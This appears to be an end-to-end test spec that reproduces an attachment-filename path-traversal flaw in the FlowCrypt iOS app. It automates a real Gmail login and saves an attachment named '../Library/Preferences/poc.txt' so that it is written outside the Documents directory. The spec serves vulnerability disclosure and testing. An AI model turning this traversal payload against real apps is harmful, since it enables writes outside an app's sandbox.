/*
 * Real-app reproduction spec: attachment filename path traversal.
 *
 * Runs the official unmodified FlowCrypt iOS app in the iOS Simulator with:
 *   - REAL Gmail OAuth login (no --mock-* flags),
 *   - a REAL delivered email whose attachment name is
 *     "../Library/Preferences/poc.txt".
 *
 * Tapping the attachment and pressing save goes through:
 *   handleAttachmentTap -> getAttachment -> decrypt -> AttachmentManager.download
 *   -> FilesManager.save -> documentsDirectoryURL.appendingPathComponent(file.name)
 * which writes outside Documents/.
 *
 * The workflow records the simulator screen around the critical steps via
 * /tmp/start_recording and /tmp/stop_recording markers written by this spec.
 */
import fs from 'fs';
import ElementHelper from '../../helpers/ElementHelper';
import {
  SplashScreen,
  SetupKeyScreen,
  MailFolderScreen,
  EmailScreen,
  AttachmentScreen,
} from '../../screenobjects/all-screens';

const SUBJECT = 'Weekly report';
const ATTACHMENT_NAME = '../Library/Preferences/poc.txt';

describe('REPRO: attachment filename path traversal', () => {
  it('saves an attachment outside the Documents directory', async () => {
    const email = process.env.REPRO_EMAIL as string;
    const password = process.env.REPRO_PASSWORD as string;

    expect(email).toBeTruthy();
    expect(password).toBeTruthy();

    // 0. Wait for the freshly installed app to boot all the way to the
    //    sign-in screen. First launch of a debug build on a cold simulator
    //    can take well over the default 15s.
    console.log('DIAG: waiting for the app sign-in screen...');
    await (await $('~aid-sign-in-gmail-btn')).waitForDisplayed({ timeout: 120000 });
    console.log('DIAG: sign-in screen is up');

    // 1. Real Gmail OAuth login. Same flow as the official SplashScreen.login,
    //    but tolerant of the system consent alert ("...Wants to Use google.com
    //    to Sign In") being absent in the CI environment.
    await SplashScreen.clickContinueWithGmail();
    try {
      await SplashScreen.clickContinueBtn();
    } catch (e) {
      console.log('DIAG: no system consent alert appeared, continuing');
    }
    try {
      await SplashScreen.changeLanguage();
    } catch (e) {
      // Google's language footer is often below the fold in CI; the page is
      // served in English for the en-US simulator anyway, so continue.
      console.log('DIAG: language step skipped (selector not reachable)');
    }
    await SplashScreen.gmailLogin(email, password);
    await ElementHelper.waitElementInvisible(await SplashScreen.signInAsGoogleAccounLabel);

    // 2. First-run setup (mirrors the repo's own setPassPhraseForOtherProviderEmail):
    //    wait until either a key backup ("load account") or "create new key" appears.
    const passPhrase = 'London blueBARREY capi';
    let count = 0;
    do {
      await browser.pause(1000);
      count++;
    } while (
      (await (await SetupKeyScreen.loadAccountButton).isDisplayed()) !== true &&
      (await (await SetupKeyScreen.createNewKeyButton).isDisplayed()) !== true &&
      (await (await SetupKeyScreen.enterPassPhraseField).isDisplayed()) !== true &&
      count <= 90
    );

    if ((await (await SetupKeyScreen.enterPassPhraseField).isDisplayed()) !== true) {
      // no key backups found -> create a fresh key
      await SetupKeyScreen.clickCreateNewKeyButton();
      await SetupKeyScreen.fillPassPhrase(passPhrase);
      await SetupKeyScreen.confirmPassPhrase(passPhrase);
    } else {
      await SetupKeyScreen.fillPassPhrase(passPhrase);
      await SetupKeyScreen.clickLoadAccountButton();
    }

    // 3. Wait for the inbox and the crafted email delivered by the workflow
    await MailFolderScreen.checkInboxScreen();
    let found = false;
    for (let i = 0; i < 30; i++) {
      const el = await $(`~${SUBJECT}`);
      if (await el.isDisplayed()) {
        found = true;
        break;
      }
      await MailFolderScreen.refreshMailList();
      await browser.pause(5000);
    }
    expect(found).toBeTruthy();

    // 4. Open the email and check the attachment shows the traversal name
    await MailFolderScreen.clickOnEmailBySubject(SUBJECT);
    await EmailScreen.checkAttachment(ATTACHMENT_NAME);

    // 5. Signal the workflow recorder, then tap the attachment
    fs.writeFileSync('/tmp/start_recording', '');
    await browser.pause(6000);
    await EmailScreen.clickOnAttachmentCell();

    // 6. Attachment view title is the traversal name; press save
    try {
      await AttachmentScreen.checkAttachment(ATTACHMENT_NAME);
      await browser.pause(3000);
      await AttachmentScreen.clickSaveButton();
      await browser.pause(3000);
      // system export dialog shows the saved file (name may vary by iOS version)
      try {
        await AttachmentScreen.checkDownloadPopUp('poc');
      } catch (e) {
        // non-fatal: the write already happened
      }
    } catch (e) {
      // if the type was not previewable the tap already downloaded it
      await browser.pause(3000);
    }

    fs.writeFileSync('/tmp/stop_recording', '');
    await browser.pause(3000);
  });
});
